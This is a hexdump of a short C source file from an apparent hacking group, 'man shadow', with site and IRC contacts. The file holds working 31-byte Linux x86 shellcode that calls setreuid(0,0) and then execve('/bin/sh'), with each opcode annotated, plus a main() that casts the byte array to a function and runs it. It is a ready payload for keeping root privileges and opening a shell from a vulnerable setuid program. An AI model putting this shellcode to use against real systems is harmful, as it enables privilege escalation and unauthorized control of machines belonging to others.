00000000  2f 2a 20 33 31 20 62 79  74 65 20 73 65 74 72 65  |/* 31 byte setre|
00000010  75 69 64 28 29 20 73 68  65 6c 6c 63 6f 64 65 20  |uid() shellcode |
00000020  2d 20 23 20 6d 61 6e 20  73 68 61 64 6f 77 0d 0a  |- # man shadow..|
00000030  2a 20 6f 73 3a 20 53 6c  61 63 6b 77 61 72 65 20  |* os: Slackware |
00000040  39 2e 31 2c 20 50 68 6c  61 6b 20 32 2e 34 2c 20  |9.1, Phlak 2.4, |
00000050  4b 6e 6f 70 70 69 78 20  30 2e 31 0d 0a 2a 0d 0a  |Knoppix 0.1..*..|
00000060  2a 20 77 77 77 2e 6d 61  6e 73 68 61 64 6f 77 2e  |* www.manshadow.|
00000070  6f 72 67 0d 0a 2a 20 72  2d 32 32 40 6d 61 6e 73  |org..* r-22@mans|
00000080  68 61 64 6f 77 2e 6f 72  67 0d 0a 2a 20 69 72 63  |hadow.org..* irc|
00000090  2e 65 66 6e 65 74 2e 6e  65 74 20 23 5f 6d 61 6e  |.efnet.net #_man|
000000a0  5f 73 68 61 64 6f 77 0d  0a 2a 2f 0d 0a 0d 0a 63  |_shadow..*/....c|
000000b0  68 61 72 20 73 68 65 6c  6c 63 6f 64 65 5b 5d 20  |har shellcode[] |
000000c0  3d 0d 0a 22 5c 78 33 31  5c 78 43 39 22 20 20 20  |=.."\x31\xC9"   |
000000d0  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 78 6f  |           /* xo|
000000e0  72 20 65 63 78 2c 65 63  78 20 20 20 20 20 2a 2f  |r ecx,ecx     */|
000000f0  0d 0a 22 5c 78 33 31 5c  78 44 42 22 20 20 20 20  |.."\x31\xDB"    |
00000100  20 20 20 20 20 20 20 20  20 20 2f 2a 20 78 6f 72  |          /* xor|
00000110  20 65 62 78 2c 65 62 78  20 20 20 20 20 2a 2f 0d  | ebx,ebx     */.|
00000120  0a 22 5c 78 36 41 5c 78  34 36 22 20 20 20 20 20  |."\x6A\x46"     |
00000130  20 20 20 20 20 20 20 20  20 2f 2a 20 70 75 73 68  |         /* push|
00000140  20 62 79 74 65 20 37 30  20 20 20 20 2a 2f 0d 0a  | byte 70    */..|
00000150  22 5c 78 35 38 22 20 20  20 20 20 20 20 20 20 20  |"\x58"          |
00000160  20 20 20 20 20 20 20 20  2f 2a 20 70 6f 70 20 65  |        /* pop e|
00000170  61 78 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 22  |ax         */.."|
00000180  5c 78 43 44 5c 78 38 30  22 20 20 20 20 20 20 20  |\xCD\x80"       |
00000190  20 20 20 20 20 20 20 2f  2a 20 69 6e 74 20 38 30  |       /* int 80|
000001a0  68 20 20 20 20 20 20 20  20 20 2a 2f 0d 0a 22 5c  |h         */.."\|
000001b0  78 35 31 22 20 20 20 20  20 20 20 20 20 20 20 20  |x51"            |
000001c0  20 20 20 20 20 20 2f 2a  20 70 75 73 68 20 65 63  |      /* push ec|
000001d0  78 20 20 20 20 20 20 20  20 2a 2f 0d 0a 22 5c 78  |x        */.."\x|
000001e0  36 38 5c 78 32 46 5c 78  32 46 5c 78 37 33 5c 78  |68\x2F\x2F\x73\x|
000001f0  36 38 22 20 20 2f 2a 20  70 75 73 68 20 30 78 36  |68"  /* push 0x6|
00000200  38 37 33 32 46 32 46 20  2a 2f 0d 0a 22 5c 78 36  |8732F2F */.."\x6|
00000210  38 5c 78 32 46 5c 78 36  32 5c 78 36 39 5c 78 36  |8\x2F\x62\x69\x6|
00000220  45 22 20 20 2f 2a 20 70  75 73 68 20 30 78 36 45  |E"  /* push 0x6E|
00000230  36 39 36 32 32 46 20 2a  2f 0d 0a 22 5c 78 38 39  |69622F */.."\x89|
00000240  5c 78 45 33 22 20 20 20  20 20 20 20 20 20 20 20  |\xE3"           |
00000250  20 20 20 2f 2a 20 6d 6f  76 20 65 62 78 2c 65 73  |   /* mov ebx,es|
00000260  70 20 20 20 20 20 2a 2f  0d 0a 22 5c 78 35 31 22  |p     */.."\x51"|
00000270  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000280  20 20 2f 2a 20 70 75 73  68 20 65 63 78 20 20 20  |  /* push ecx   |
00000290  20 20 20 20 20 2a 2f 0d  0a 22 5c 78 35 33 22 20  |     */.."\x53" |
000002a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002b0  20 2f 2a 20 70 75 73 68  20 65 62 78 20 20 20 20  | /* push ebx    |
000002c0  20 20 20 20 2a 2f 0d 0a  22 5c 78 38 39 5c 78 45  |    */.."\x89\xE|
000002d0  31 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1"              |
000002e0  2f 2a 20 6d 6f 76 20 65  63 78 2c 65 73 70 20 20  |/* mov ecx,esp  |
000002f0  20 20 20 2a 2f 0d 0a 22  5c 78 39 39 22 20 20 20  |   */.."\x99"   |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000310  2a 20 63 64 71 20 20 20  20 20 20 20 20 20 20 20  |* cdq           |
00000320  20 20 2a 2f 0d 0a 22 5c  78 42 30 5c 78 30 42 22  |  */.."\xB0\x0B"|
00000330  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
00000340  20 6d 6f 76 20 61 6c 2c  31 31 20 20 20 20 20 20  | mov al,11      |
00000350  20 2a 2f 0d 0a 22 5c 78  43 44 5c 78 38 30 22 3b  | */.."\xCD\x80";|
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2a 20  |             /* |
00000370  69 6e 74 20 38 30 68 20  20 20 20 20 20 20 20 20  |int 80h         |
00000380  2a 2f 0d 0a 0d 0a 69 6e  74 20 6d 61 69 6e 28 69  |*/....int main(i|
00000390  6e 74 20 61 72 67 63 2c  20 63 68 61 72 20 2a 61  |nt argc, char *a|
000003a0  72 67 76 5b 5d 29 20 7b  0d 0a 20 20 20 20 20 20  |rgv[]) {..      |
000003b0  20 76 6f 69 64 20 28 2a  73 63 29 28 29 20 3d 20  | void (*sc)() = |
000003c0  28 76 6f 69 64 20 2a 29  73 68 65 6c 6c 63 6f 64  |(void *)shellcod|
000003d0  65 3b 0d 0a 20 20 20 20  20 20 20 70 72 69 6e 74  |e;..       print|
000003e0  66 28 22 6c 65 6e 3a 25  64 5c 6e 22 2c 20 73 74  |f("len:%d\n", st|
000003f0  72 6c 65 6e 28 73 68 65  6c 6c 63 6f 64 65 29 29  |rlen(shellcode))|
00000400  3b 0d 0a 20 20 20 20 20  20 20 73 63 28 29 3b 0d  |;..       sc();.|
00000410  0a 20 20 20 20 20 20 20  72 65 74 75 72 6e 20 30  |.       return 0|
00000420  3b 0d 0a 7d                                       |;..}|
00000424
